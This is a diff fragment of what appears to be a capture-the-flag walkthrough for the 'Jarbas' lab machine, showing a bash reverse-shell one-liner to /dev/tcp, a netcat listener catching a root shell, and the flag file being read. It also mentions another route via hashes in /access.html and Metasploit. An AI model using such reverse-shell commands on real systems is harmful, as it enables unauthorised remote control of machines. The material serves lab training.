@@ -178,9 +178,31 @@ bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
 and wait for the shell after 5 minutes :
 
 ```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.240] 53572
+bash: no job control in this shell
 
+[root@jarbas ~]# id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
+
+[root@jarbas ~]# ls
+flag.txt
+
+[root@jarbas ~]# cat flag.txt
+Hey!
+
+Congratulations! You got it! I always knew you could do it!
+This challenge was very easy, huh? =)
+
+Thanks for appreciating this machine.
+
+@tiagotvrs 
 ```
 
+this is how you can get root on this machine.
+
+there is also another way, to find the user hashes in /access.html file on port 80 and then use metasploit to get the shell :)
 
 
 
